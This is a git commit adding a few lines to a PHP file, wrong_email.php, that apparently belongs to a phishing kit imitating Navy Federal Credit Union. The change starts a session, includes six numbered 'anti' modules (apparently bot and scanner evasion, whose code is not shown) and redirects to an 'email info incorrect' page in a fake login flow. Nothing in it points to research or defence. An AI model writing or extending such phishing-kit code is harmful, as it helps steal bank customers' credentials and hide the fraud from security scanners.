e2bacffe1294b158156702480fc8676cb1570a9e
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 10:27:51 +0200

    Update wrong_email.php

--- wrong_email.php
+++ wrong_email.php
@@ -1,3 +1,10 @@
 <?php
+session_start();
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php";
 header('Location: /navy_fed/email_info_incorrect');
 ?>
